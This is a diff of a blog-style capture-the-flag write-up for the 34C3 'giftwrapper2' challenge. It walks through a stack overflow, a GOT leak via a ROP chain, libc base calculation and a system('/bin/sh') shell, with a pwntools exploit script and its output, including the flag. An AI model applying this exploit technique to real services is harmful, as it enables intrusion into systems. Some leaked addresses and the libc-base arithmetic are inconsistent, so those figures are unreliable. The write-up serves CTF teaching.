@@ -384,7 +384,7 @@ $
 
 <p>The next step is to know from what offset we start controlling the instruction pointer <strong>rip</strong>, we can do this manually but trying different lengths, but we can also use <code>ragg2</code> to generate a <a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence">Debruijn sequence</a> and calculate the exact offset after the crash.</p>
 
-<p>The size of wrap&rsquo;s stack frame is 0x70 (112 in decimal), so let&rsquo;s generate a sequence slightly greater than 112</p>
+<p>The size of wrap&rsquo;s stack frame is <strong>0x70</strong> (112 in decimal), so let&rsquo;s generate a sequence slightly greater than 112</p>
 
 <pre><code class="language-shell">$ ragg2 -r -P 140
 AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuA
@@ -422,7 +422,7 @@ $ sudo dmesg | tail
 $ 
 </code></pre>
 
-<p>Great, at the moment of crash, the instruction pointer was pointing to 0x41754141. Again using <code>ragg2</code> we can calculate the offset.</p>
+<p>Great, at the moment of crash, the instruction pointer was pointing to <strong>0x41754141</strong>. Again using <code>ragg2</code> we can calculate the offset.</p>
 
 <pre><code class="language-shell">$ ragg2 -q 0x41754141
 Little endian: 136
@@ -435,7 +435,7 @@ $
 <p>At this step we know that we control the instruction pointer, we also know that the stack is executable. One way to exploit this is to <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">return to libc</a>, but since we don&rsquo;t know at what address <code>libc</code> is linked, we need to leak some addresses.</p>
 
 <p>Using <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a> we can read from anywhere, this is done because the function <code>puts</code> actually prints bytes from the addresse pointed by <code>rdi</code> register. So by chaining
-<code>pop rdi</code> and <code>call puts</code> gadgets we can mount a read-anywhere attack. In order to calculate <code>libc</code> base address we need to read the address of any symbol from it, since we know that, for performance reason, all modules are page aligned (4kb aligned). Reading any symbol from the <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">GOT</a> table allows us to leak addresses from <code>libc</code>, one good condidate is puts&rsquo; entry in <code>GOT</code>, to get it&rsquo;s address we can use <code>objdump -R</code>:</p>
+<code>pop rdi</code> and <code>call puts</code> gadgets we can mount a read-anywhere attack. In order to calculate <code>libc</code> base address we need to read the address of any symbol from it. Reading any symbol from the <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">GOT</a> table allows us to leak addresses from <code>libc</code>, one good condidate is puts&rsquo; entry in <code>GOT</code>, to get it&rsquo;s address we can use <code>objdump -R</code>:</p>
 
 <pre><code class="language-shell">$ objdump -R server
 server:     file format elf64-x86-64
@@ -448,7 +448,7 @@ OFFSET           TYPE              VALUE
 $ 
 </code></pre>
 
-<p>Now we only need a <code>pop rdi</code> gadget. By using <code>radare2</code> we can get that, below we cann that radare2 found two <code>pop rdi</code> gadgets:</p>
+<p>Now we only need a <code>pop rdi</code> gadget. By using <code>radare2</code> we can get that, below we see that radare2 found two <code>pop rdi</code> gadgets:</p>
 
 <pre><code class="language-shell">$ radare2 server
 [0x00400dc0]&gt; /Rl pop rdi
@@ -457,18 +457,109 @@ $
 [0x00400dc0]&gt; 
 </code></pre>
 
-<p>The following python code create the rop chain.</p>
+<p>The following python code connect to server, interact with it and then send our rop chain. I&rsquo;am using <a href="https://github.com/Gallopsled/pwntools">Pwntools</a> to do this, since it make network programming much more easy and funny.</p>
 
-<pre><code class="language-python">
-pop_rdi   = 0x00401550
-puts_got  = 0x602018
+<pre><code class="language-python">from pwn import *
+
+r = remote('localhost', 12345)
+pop_rdi = 0x00401550
+puts_got = 0x602018
 call_puts = 0x0040122f
 
-rop  = &quot;A&quot; * 136 # fill the buffer
-rop += pop_rdi
-rop += puts_got
-rop += call_puts
+rop = p64(pop_rdi)
+rop += p64(puts_got)
+rop += p64(call_puts)
+
+payload = &quot;A&quot; * 136  # fill the buffer
+payload += rop       # Append our rop chain
+
+r.sendlineafter(&quot;&gt; &quot;, &quot;wrap&quot;)  # Send the wrap command
+r.sendlineafter(&quot;|&gt; &quot;, &quot;-1&quot;)  # set the size to -1
+r.sendlineafter(&quot;|&gt; &quot;, payload)  # send the payload
+
+# Get the last sended line, this contain raw data read from *puts_got
+r.recvuntil(&quot;Wow! This looks so beautiful\n&quot;)  # recv the data
+data = r.recvline().strip()
+print(repr(data)) # print raw data so we can verify
+
+# Pad the address to 8 bytes so we can unpack it
+pad = &quot;\x00&quot; * (8 - len(data))
+addr = data + pad
+
+# Unpack the addr
+puts_absolute = u64(addr)
+print &quot;puts is at&quot;, hex(puts_absolute)
 </code></pre>
+
+<pre><code class="language-shell">$ python giftwrapper2_exploit.py
+[..] Opening connection to localhost on port 12345: Trying 127.0.0.1
+New connection from 127.0.0.1 on port 40450
+[+] Opening connection to localhost on port 12345: Done
+127.0.0.1:40450 disconnected
+'`\xc1\x07\xa0\xeb\x7f'
+puts is at 0x7feba007c460
+</code></pre>
+
+<p>Now we know that the absolute address of <code>puts</code> is <strong>0x7feba007c460</strong>, and since we have the libc used by the server we can know puts&rsquo; offset within that libc, we just need to open <code>libc-2.26.so</code> using binary ninja (or radare2 and use the <code>is</code> command) and navigste to <code>puts</code> function:</p>
+
+<p>
+<figure class="text-center">
+    
+        <img src="../../img/34c3-ctf-2017/giftwrapper2-binja-puts.png" />
+    
+    
+</figure>
+
+<br/></p>
+
+<p>Here it shows that puts&rsquo; offset within libc is <strong>0x78460</strong>, given this we can calculate libc base address.</p>
+
+<blockquote>
+<p>libc_base = puts absolute address - puts relative offset</p>
+
+<p>libc_base = <strong>0x7feba007c160</strong> - <strong>0x78460</strong> = <strong>0x7feba0004000</strong></p>
+</blockquote>
+
+<p>By having the libc base address we can get the absolute of any symbol within it, so now we just need to call <code>system(&quot;/bin/sh&quot;)</code> and have our flag.</p>
+
+<p>Again using binary ninja we can get the offset of <code>system</code> as well as the string <code>/bin/sh</code>. <br>Argument for <code>system</code> are passed via <code>rdi</code> register, so just before jumping to it we need to load rdi with the address of <code>/bin/sh</code>.</p>
+
+<p>We already have a <code>pop rdi</code> gadget so this should be easy now. The final exploit is the following:</p>
+
+<script src="//gist.github.com/segflow/65ed5e55ad83ce9b5cf4aec9c0bc3ced.js"></script>
+
+<pre><code class="language-shell">&gt; $ python giftwrapper2_exploit.py
+[/.......] Opening connection to localhost on port 12345: Trying 127.0.0.1
+New connection from 127.0.0.1 on port 40450
+[+] Opening connection to localhost on port 12345: Done
+127.0.0.1:40450 disconnected
+'`\xc1\x07\xa0\xeb\x7f'
+puts is at 0x7feba007c160
+libc is at 0x7feba0012000
+system is at 0x7feba0052d60
+/bin/sh is at 0x7feba017a917
+[*] Closed connection to localhost port 12345
+[▁] Opening connection to localhost on port 12345: Trying 127.0.0.1
+New connection from 127.0.0.1 on port 40452
+[+] Opening connection to localhost on port 12345: Done
+[*] Switching to interactive mode
+         _   _
+        ((\o/))
+ .-------//^\\------.
+ |      /`   `\     |
+ |                  |
+ |                  |
+  ------------------
+
+Wow! This looks so beautiful
+$ id
+uid=1001(challenge) gid=1001(challenge) groups=1001(challenge)
+$ cat flag.txt
+34C3_r0p_wr4pP3d_g1fts_ar3_tH3_b3st_g1fts
+$ 
+</code></pre>
+
+<p>Flag: <strong>34C3_r0p_wr4pP3d_g1fts_ar3_tH3_b3st_g1fts</strong></p>
 	</article>
 </main>
 
